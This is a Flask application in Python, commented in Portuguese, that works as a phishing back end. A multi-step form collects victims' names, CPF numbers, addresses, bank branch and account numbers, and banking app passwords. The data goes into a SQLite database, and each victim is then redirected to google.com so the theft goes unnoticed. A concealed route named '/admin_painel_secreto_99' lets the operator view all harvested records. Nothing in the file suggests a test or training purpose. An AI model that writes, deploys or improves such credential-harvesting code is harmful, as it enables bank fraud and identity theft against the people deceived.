from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import os

app = Flask(__name__)

# Configuração do Banco de Dados
def init_db():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT, cpf TEXT,
            cep TEXT, rua TEXT,
            agencia TEXT, conta TEXT, senha_app TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Coleta de dados dos 3 passos
    dados = (
        request.form.get('nome'), request.form.get('cpf'),
        request.form.get('cep'), request.form.get('rua'),
        request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
    )
    
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO usuarios (nome, cpf, cep, rua, agencia, conta, senha_app)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', dados)
    conn.commit()
    conn.close()
    
    return redirect('https://www.google.com')

# PAINEL DO ADMIN
@app.route('/admin_painel_secreto_99')
def admin():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
    usuarios = cursor.fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




